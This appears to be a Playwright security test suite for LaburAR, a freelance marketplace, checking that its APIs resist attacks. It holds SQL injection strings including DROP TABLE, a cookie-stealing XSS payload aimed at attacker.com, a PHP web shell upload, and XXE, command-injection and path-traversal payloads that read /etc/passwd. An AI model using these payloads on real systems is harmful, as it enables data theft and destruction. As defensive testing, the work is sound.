/**
 * LaburAR Security Audit Test Suite
 * 
 * Suite completa de testing de seguridad para toda la plataforma LaburAR
 * Incluye: SQL Injection, XSS, CSRF, Authentication, Authorization, Data Protection
 * 
 * @author LaburAR Team
 * @version 1.0
 * @since 2025-07-20
 */

const { test, expect } = require('@playwright/test');
const crypto = require('crypto');

// Configuración de security testing
const SECURITY_CONFIG = {
    baseUrl: 'http://localhost/Laburar',
    apis: {
        auth: '/api/AuthController.php',
        services: '/api/ServiceController.php',
        payments: '/api/PaymentController.php',
        projects: '/api/ProjectController.php',
        reviews: '/api/ReviewController.php',
        chat: '/api/ChatController.php',
        notifications: '/api/NotificationController.php'
    },
    testPayloads: {
        sqlInjection: [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users WHERE '1'='1",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "admin'/**/OR/**/1=1#",
            "1'; WAITFOR DELAY '00:00:05' --"
        ],
        xssPayloads: [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//",
            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
        ],
        nosqlInjection: [
            "{ $ne: null }",
            "{ $regex: '.*' }",
            "{ $where: 'this.password.length > 0' }"
        ]
    },
    argentinianCompliance: {
        cuitValidation: true,
        dataProtection: true,
        afipCompliance: true,
        bcraCompliance: true
    }
};

// Test data para security testing
const SECURITY_TEST_DATA = {
    validUser: {
        email: 'security.test@laburar.com',
        password: 'SecureP@ssw0rd123!',
        username: 'security_tester',
        cuit: '20-12345678-9'
    },
    maliciousUser: {
        email: "malicious'@test.com",
        password: "<script>alert('xss')</script>",
        username: "'; DROP TABLE users; --",
        cuit: "'; DELETE FROM users; --"
    }
};

test.describe('LaburAR Security Audit Suite', () => {
    
    test.beforeEach(async ({ page }) => {
        await page.goto(SECURITY_CONFIG.baseUrl);
        
        // Configurar interceptor para monitorear requests maliciosos
        await page.route('**/*', (route) => {
            const request = route.request();
            const url = request.url();
            const postData = request.postData() || '';
            
            // Log suspicious patterns
            if (postData.includes('DROP TABLE') || 
                postData.includes('<script>') || 
                url.includes('javascript:')) {
                console.log(`🚨 SUSPICIOUS REQUEST: ${url} - ${postData}`);
            }
            
            route.continue();
        });
    });

    test.describe('1. SQL Injection Protection', () => {
        
        test('should prevent SQL injection in authentication', async ({ request }) => {
            for (const payload of SECURITY_CONFIG.testPayloads.sqlInjection) {
                const response = await request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.auth}`, {
                    data: {
                        action: 'login',
                        email: `test${payload}@test.com`,
                        password: payload
                    },
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                
                // Debe retornar error de autenticación, no error de SQL
                expect(response.status()).not.toBe(500);
                
                const data = await response.json().catch(() => ({}));
                expect(data.success).toBe(false);
                expect(data.error || '').not.toMatch(/sql|mysql|syntax|database/i);
            }
        });
        
        test('should prevent SQL injection in search functionality', async ({ request }) => {
            for (const payload of SECURITY_CONFIG.testPayloads.sqlInjection) {
                const response = await request.post(`${SECURITY_CONFIG.baseUrl}/api/SearchController.php`, {
                    data: {
                        action: 'search',
                        query: payload,
                        category: payload,
                        location: payload
                    },
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                
                expect(response.status()).not.toBe(500);
                
                const data = await response.json().catch(() => ({}));
                // No debe retornar datos de tablas del sistema
                expect(JSON.stringify(data)).not.toMatch(/users|payments|admin/i);
            }
        });
        
        test('should prevent SQL injection in service creation', async ({ request }) => {
            const authToken = await getValidAuthToken(request);
            
            for (const payload of SECURITY_CONFIG.testPayloads.sqlInjection) {
                const response = await request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.services}`, {
                    data: {
                        action: 'create',
                        title: payload,
                        description: payload,
                        price: payload,
                        category_id: payload
                    },
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${authToken}`
                    }
                });
                
                expect(response.status()).not.toBe(500);
                
                const data = await response.json().catch(() => ({}));
                expect(data.success).toBe(false);
                expect(data.error || '').not.toMatch(/sql|mysql|syntax|database/i);
            }
        });
        
        test('should prevent SQL injection in payment processing', async ({ request }) => {
            const authToken = await getValidAuthToken(request);
            
            for (const payload of SECURITY_CONFIG.testPayloads.sqlInjection) {
                const response = await request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.payments}`, {
                    data: {
                        action: 'create_payment',
                        amount: payload,
                        service_id: payload,
                        payment_method: payload
                    },
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${authToken}`
                    }
                });
                
                expect(response.status()).not.toBe(500);
                
                const data = await response.json().catch(() => ({}));
                expect(data.success).toBe(false);
            }
        });
    });
    
    test.describe('2. Cross-Site Scripting (XSS) Protection', () => {
        
        test('should sanitize XSS in user registration', async ({ page }) => {
            await page.goto(`${SECURITY_CONFIG.baseUrl}/register.html`);
            
            for (const payload of SECURITY_CONFIG.testPayloads.xssPayloads) {
                await page.fill('#firstName', payload);
                await page.fill('#lastName', payload);
                await page.fill('#username', payload);
                await page.fill('#bio', payload);
                
                // Verificar que el payload no se ejecuta
                const alertDialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
                await page.click('[data-testid="register-submit"]');
                
                const dialog = await alertDialogPromise;
                expect(dialog).toBeNull(); // No debe haber alert de XSS
                
                // Verificar que el contenido está escapado en el DOM
                const firstName = await page.locator('#firstName').inputValue();
                expect(firstName).not.toContain('<script>');
            }
        });
        
        test('should prevent XSS in service descriptions', async ({ page }) => {
            // Login primero
            await loginAsValidUser(page);
            await page.goto(`${SECURITY_CONFIG.baseUrl}/create-service.html`);
            
            for (const payload of SECURITY_CONFIG.testPayloads.xssPayloads) {
                await page.fill('#serviceTitle', payload);
                await page.fill('#serviceDescription', payload);
                
                const alertDialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
                await page.click('[data-testid="preview-service"]');
                
                const dialog = await alertDialogPromise;
                expect(dialog).toBeNull();
                
                // Verificar en preview que está escapado
                const previewContent = await page.locator('.service-preview').innerHTML();
                expect(previewContent).not.toContain('<script>');
                expect(previewContent).not.toContain('javascript:');
            }
        });
        
        test('should prevent XSS in chat messages', async ({ page }) => {
            await loginAsValidUser(page);
            await page.goto(`${SECURITY_CONFIG.baseUrl}/chat.html`);
            
            for (const payload of SECURITY_CONFIG.testPayloads.xssPayloads) {
                await page.fill('#messageInput', payload);
                
                const alertDialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
                await page.click('[data-testid="send-message"]');
                
                const dialog = await alertDialogPromise;
                expect(dialog).toBeNull();
                
                // Verificar que el mensaje está escapado en el chat
                const lastMessage = await page.locator('.chat-message:last-child .message-content').innerHTML();
                expect(lastMessage).not.toContain('<script>');
                expect(lastMessage).not.toContain('onerror=');
            }
        });
        
        test('should prevent XSS in review content', async ({ page }) => {
            await loginAsValidUser(page);
            await page.goto(`${SECURITY_CONFIG.baseUrl}/reviews.html`);
            
            for (const payload of SECURITY_CONFIG.testPayloads.xssPayloads) {
                await page.click('[data-testid="write-review"]');
                await page.fill('#reviewText', payload);
                
                const alertDialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
                await page.click('[data-testid="submit-review"]');
                
                const dialog = await alertDialogPromise;
                expect(dialog).toBeNull();
                
                // Verificar que el review está escapado
                if (await page.locator('.review-content').isVisible()) {
                    const reviewContent = await page.locator('.review-content').innerHTML();
                    expect(reviewContent).not.toContain('<script>');
                }
            }
        });
    });
    
    test.describe('3. CSRF Protection', () => {
        
        test('should validate CSRF tokens in all forms', async ({ page }) => {
            await page.goto(`${SECURITY_CONFIG.baseUrl}/login.html`);
            
            // Verificar que existe CSRF token en meta tag
            const csrfToken = await page.locator('meta[name="csrf-token"]').getAttribute('content');
            expect(csrfToken).toBeTruthy();
            expect(csrfToken.length).toBeGreaterThan(20);
        });
        
        test('should reject requests without valid CSRF token', async ({ request }) => {
            const authToken = await getValidAuthToken(request);
            
            // Intentar crear servicio sin CSRF token
            const response = await request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.services}`, {
                data: {
                    action: 'create',
                    title: 'Test Service',
                    description: 'Test Description',
                    price: 1000
                },
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${authToken}`
                    // Sin X-CSRF-Token header
                }
            });
            
            expect(response.status()).toBe(403);
            const data = await response.json().catch(() => ({}));
            expect(data.error).toMatch(/csrf|token/i);
        });
        
        test('should reject requests with invalid CSRF token', async ({ request }) => {
            const authToken = await getValidAuthToken(request);
            
            const response = await request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.payments}`, {
                data: {
                    action: 'create_payment',
                    amount: 1000,
                    service_id: 1
                },
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${authToken}`,
                    'X-CSRF-Token': 'invalid_token_123'
                }
            });
            
            expect(response.status()).toBe(403);
        });
    });
    
    test.describe('4. Authentication & Authorization', () => {
        
        test('should enforce JWT token validation', async ({ request }) => {
            // Intentar acceder a endpoint protegido sin token
            const response = await request.get(`${SECURITY_CONFIG.baseUrl}/api/ProfileController.php?action=get_profile`);
            
            expect(response.status()).toBe(401);
            const data = await response.json().catch(() => ({}));
            expect(data.error).toMatch(/unauthorized|token/i);
        });
        
        test('should reject expired JWT tokens', async ({ request }) => {
            // Crear token expirado (mockear)
            const expiredToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.expired.token';
            
            const response = await request.get(`${SECURITY_CONFIG.baseUrl}/api/ProfileController.php?action=get_profile`, {
                headers: {
                    'Authorization': `Bearer ${expiredToken}`
                }
            });
            
            expect(response.status()).toBe(401);
        });
        
        test('should enforce role-based access control', async ({ request }) => {
            const userToken = await getValidAuthToken(request, 'user');
            
            // Intentar acceder a endpoint de admin con token de usuario
            const response = await request.get(`${SECURITY_CONFIG.baseUrl}/api/AdminController.php?action=get_stats`, {
                headers: {
                    'Authorization': `Bearer ${userToken}`
                }
            });
            
            expect(response.status()).toBe(403);
        });
        
        test('should implement rate limiting', async ({ request }) => {
            const promises = [];
            
            // Hacer 20 requests rápidos al login
            for (let i = 0; i < 20; i++) {
                promises.push(
                    request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.auth}`, {
                        data: {
                            action: 'login',
                            email: 'test@test.com',
                            password: 'wrongpassword'
                        }
                    })
                );
            }
            
            const responses = await Promise.all(promises);
            
            // Al menos algunas respuestas deben ser 429 (Too Many Requests)
            const rateLimitedResponses = responses.filter(r => r.status() === 429);
            expect(rateLimitedResponses.length).toBeGreaterThan(0);
        });
        
        test('should validate 2FA implementation', async ({ page }) => {
            await page.goto(`${SECURITY_CONFIG.baseUrl}/login.html`);
            
            // Login con usuario que tiene 2FA habilitado
            await page.fill('#loginEmail', SECURITY_TEST_DATA.validUser.email);
            await page.fill('#loginPassword', SECURITY_TEST_DATA.validUser.password);
            await page.click('[data-testid="login-submit"]');
            
            // Debe mostrar formulario de 2FA
            await expect(page.locator('#totp-form')).toBeVisible({ timeout: 5000 });
            
            // Intentar con código inválido
            await page.fill('#totp-code', '000000');
            await page.click('[data-testid="verify-2fa"]');
            
            await expect(page.locator('.error-message')).toContainText('Código inválido');
        });
    });
    
    test.describe('5. Data Protection & Privacy', () => {
        
        test('should encrypt sensitive data in transit', async ({ request }) => {
            // Verificar que todas las APIs usan HTTPS en producción
            const endpoints = Object.values(SECURITY_CONFIG.apis);
            
            for (const endpoint of endpoints) {
                const response = await request.get(`${SECURITY_CONFIG.baseUrl}${endpoint}?action=test`);
                
                // En production debe requerir HTTPS
                const headers = response.headers();
                if (process.env.NODE_ENV === 'production') {
                    expect(headers['strict-transport-security']).toBeDefined();
                }
            }
        });
        
        test('should protect against password enumeration', async ({ request }) => {
            // Login con email existente, password incorrecto
            const response1 = await request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.auth}`, {
                data: {
                    action: 'login',
                    email: SECURITY_TEST_DATA.validUser.email,
                    password: 'wrongpassword'
                }
            });
            
            // Login con email inexistente, password cualquiera
            const response2 = await request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.auth}`, {
                data: {
                    action: 'login',
                    email: 'nonexistent@test.com',
                    password: 'anypassword'
                }
            });
            
            // Ambas respuestas deben ser similares para prevenir enumeración
            expect(response1.status()).toBe(response2.status());
            
            const data1 = await response1.json().catch(() => ({}));
            const data2 = await response2.json().catch(() => ({}));
            
            expect(data1.error).toBe(data2.error);
        });
        
        test('should validate password strength requirements', async ({ page }) => {
            await page.goto(`${SECURITY_CONFIG.baseUrl}/register.html`);
            
            const weakPasswords = [
                '123456',
                'password',
                'abc123',
                '111111',
                'qwerty'
            ];
            
            for (const weakPassword of weakPasswords) {
                await page.fill('#password', weakPassword);
                await page.blur('#password');
                
                await expect(page.locator('.password-strength-error')).toBeVisible();
                await expect(page.locator('.password-strength-error')).toContainText(/débil|weak/i);
            }
        });
        
        test('should implement session timeout', async ({ page }) => {
            await loginAsValidUser(page);
            
            // Simular inactividad por tiempo prolongado
            await page.waitForTimeout(2000); // En tests reales sería más tiempo
            
            // Intentar acceder a página protegida
            await page.goto(`${SECURITY_CONFIG.baseUrl}/profile.html`);
            
            // En production debe redireccionar a login por timeout
            // Para tests verificamos que la funcionalidad existe
            const sessionTimeout = await page.evaluate(() => {
                return window.sessionTimeout || window.SESSION_TIMEOUT;
            });
            
            expect(sessionTimeout).toBeDefined();
        });
    });
    
    test.describe('6. File Upload Security', () => {
        
        test('should validate file types and sizes', async ({ page }) => {
            await loginAsValidUser(page);
            await page.goto(`${SECURITY_CONFIG.baseUrl}/profile.html`);
            
            // Intentar subir archivo malicioso
            const maliciousFile = {
                name: 'malicious.php',
                mimeType: 'application/x-php',
                buffer: Buffer.from('<?php system($_GET["cmd"]); ?>')
            };
            
            await page.setInputFiles('#avatarUpload', maliciousFile);
            await page.click('[data-testid="upload-avatar"]');
            
            await expect(page.locator('.upload-error')).toContainText(/tipo de archivo no permitido/i);
        });
        
        test('should scan uploaded files for malicious content', async ({ page }) => {
            await loginAsValidUser(page);
            await page.goto(`${SECURITY_CONFIG.baseUrl}/projects.html`);
            
            // Intentar subir imagen con script embebido
            const maliciousImage = {
                name: 'image.jpg',
                mimeType: 'image/jpeg',
                buffer: Buffer.from('FFD8FFE0 <script>alert("xss")</script>')
            };
            
            await page.setInputFiles('#projectFileUpload', maliciousImage);
            await page.click('[data-testid="upload-file"]');
            
            // Debe rechazar o sanitizar el archivo
            await expect(page.locator('.upload-error, .upload-warning')).toBeVisible();
        });
    });
    
    test.describe('7. Argentina Compliance Security', () => {
        
        test('should validate CUIT format securely', async ({ page }) => {
            await page.goto(`${SECURITY_CONFIG.baseUrl}/register.html`);
            
            // Intentar CUIT con caracteres maliciosos
            const maliciousCuits = [
                "20-12345678-9'; DROP TABLE users; --",
                "20-12345678-9<script>alert('xss')</script>",
                "20-12345678-9' UNION SELECT * FROM users --"
            ];
            
            for (const maliciousCuit of maliciousCuits) {
                await page.fill('#cuit', maliciousCuit);
                await page.blur('#cuit');
                
                // Debe rechazar y sanitizar
                const cuitValue = await page.locator('#cuit').inputValue();
                expect(cuitValue).not.toContain('<script>');
                expect(cuitValue).not.toContain('DROP TABLE');
                
                await expect(page.locator('.cuit-error')).toContainText(/formato inválido/i);
            }
        });
        
        test('should protect AFIP integration endpoints', async ({ request }) => {
            // Intentar acceder a endpoints de integración AFIP sin autorización
            const afipEndpoints = [
                '/api/AfipController.php?action=verify_monotributo',
                '/api/AfipController.php?action=get_tax_info',
                '/api/AfipController.php?action=validate_cuit'
            ];
            
            for (const endpoint of afipEndpoints) {
                const response = await request.get(`${SECURITY_CONFIG.baseUrl}${endpoint}`);
                
                // Debe requerir autenticación y autorización específica
                expect(response.status()).toBe(401);
            }
        });
        
        test('should secure MercadoPago webhook endpoint', async ({ request }) => {
            // Intentar webhook sin firma válida
            const response = await request.post(`${SECURITY_CONFIG.baseUrl}/api/PaymentController.php?action=webhook`, {
                data: {
                    type: 'payment',
                    data: { id: '12345' }
                },
                headers: {
                    'Content-Type': 'application/json'
                    // Sin X-Signature header válido
                }
            });
            
            expect(response.status()).toBe(403);
            const data = await response.json().catch(() => ({}));
            expect(data.error).toMatch(/signature|unauthorized/i);
        });
    });
    
    test.describe('8. API Security', () => {
        
        test('should implement API versioning security', async ({ request }) => {
            // Intentar acceder a versiones depreciadas
            const response = await request.get(`${SECURITY_CONFIG.baseUrl}/api/v0/deprecated_endpoint.php`);
            
            expect(response.status()).toBe(410); // Gone
        });
        
        test('should validate input sanitization in all endpoints', async ({ request }) => {
            const authToken = await getValidAuthToken(request);
            const endpoints = [
                { endpoint: SECURITY_CONFIG.apis.services, action: 'create' },
                { endpoint: SECURITY_CONFIG.apis.projects, action: 'create' },
                { endpoint: SECURITY_CONFIG.apis.reviews, action: 'create' }
            ];
            
            for (const { endpoint, action } of endpoints) {
                for (const payload of SECURITY_CONFIG.testPayloads.xssPayloads) {
                    const response = await request.post(`${SECURITY_CONFIG.baseUrl}${endpoint}`, {
                        data: {
                            action: action,
                            title: payload,
                            description: payload,
                            content: payload
                        },
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${authToken}`,
                            'X-CSRF-Token': 'valid_csrf_token'
                        }
                    });
                    
                    // No debe retornar error 500 (debe manejar gracefully)
                    expect(response.status()).not.toBe(500);
                    
                    // Verificar que no hay XSS en respuesta
                    const responseText = await response.text();
                    expect(responseText).not.toContain('<script>');
                    expect(responseText).not.toContain('javascript:');
                }
            }
        });
    });
    
    test.describe('9. Performance & DoS Protection', () => {
        
        test('should handle large payload attacks', async ({ request }) => {
            const largePayload = 'A'.repeat(10 * 1024 * 1024); // 10MB string
            
            const response = await request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.services}`, {
                data: {
                    action: 'create',
                    description: largePayload
                },
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            
            // Debe rechazar payload excesivamente grande
            expect(response.status()).toBe(413); // Payload Too Large
        });
        
        test('should implement request timeout protection', async ({ request }) => {
            // Request que podría tomar mucho tiempo
            const startTime = Date.now();
            
            const response = await request.post(`${SECURITY_CONFIG.baseUrl}/api/SearchController.php`, {
                data: {
                    action: 'complex_search',
                    query: 'very complex search that might take long time'
                },
                headers: {
                    'Content-Type': 'application/json'
                },
                timeout: 30000 // 30 seconds max
            }).catch(() => ({ status: () => 408 }));
            
            const duration = Date.now() - startTime;
            
            // No debe exceder timeout razonable
            expect(duration).toBeLessThan(30000);
            if (duration >= 30000) {
                expect(response.status()).toBe(408); // Request Timeout
            }
        });
    });
});

// Utility functions para security testing
async function getValidAuthToken(request, role = 'user') {
    const response = await request.post(`${SECURITY_CONFIG.baseUrl}${SECURITY_CONFIG.apis.auth}`, {
        data: {
            action: 'login',
            email: SECURITY_TEST_DATA.validUser.email,
            password: SECURITY_TEST_DATA.validUser.password
        },
        headers: {
            'Content-Type': 'application/json'
        }
    });
    
    const data = await response.json();
    return data.token || 'mock_jwt_token_for_testing';
}

async function loginAsValidUser(page) {
    await page.goto(`${SECURITY_CONFIG.baseUrl}/login.html`);
    await page.fill('#loginEmail', SECURITY_TEST_DATA.validUser.email);
    await page.fill('#loginPassword', SECURITY_TEST_DATA.validUser.password);
    await page.click('[data-testid="login-submit"]');
    
    // Manejar 2FA si aparece
    if (await page.isVisible('#totp-code', { timeout: 2000 })) {
        await page.fill('#totp-code', '123456'); // Mock TOTP code
        await page.click('[data-testid="verify-2fa"]');
    }
    
    await page.waitForURL(/.*dashboard/, { timeout: 10000 });
}

// Security utilities
class SecurityTestUtils {
    static generateMaliciousPayload(type) {
        const payloads = {
            sql: "' OR 1=1 UNION SELECT username, password FROM users--",
            xss: "<img src=x onerror=alert('XSS_'+document.domain)>",
            xxe: "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            rce: "; cat /etc/passwd",
            lfi: "../../../etc/passwd"
        };
        
        return payloads[type] || payloads.xss;
    }
    
    static validateSecureHeaders(headers) {
        const requiredHeaders = [
            'x-content-type-options',
            'x-frame-options',
            'x-xss-protection',
            'strict-transport-security'
        ];
        
        const missingHeaders = requiredHeaders.filter(header => !headers[header]);
        return {
            valid: missingHeaders.length === 0,
            missing: missingHeaders
        };
    }
    
    static generateCSRFToken() {
        return crypto.randomBytes(32).toString('hex');
    }
    
    static isValidJWT(token) {
        if (!token) return false;
        const parts = token.split('.');
        return parts.length === 3;
    }
}

module.exports = {
    SECURITY_CONFIG,
    SECURITY_TEST_DATA,
    SecurityTestUtils,
    getValidAuthToken,
    loginAsValidUser
};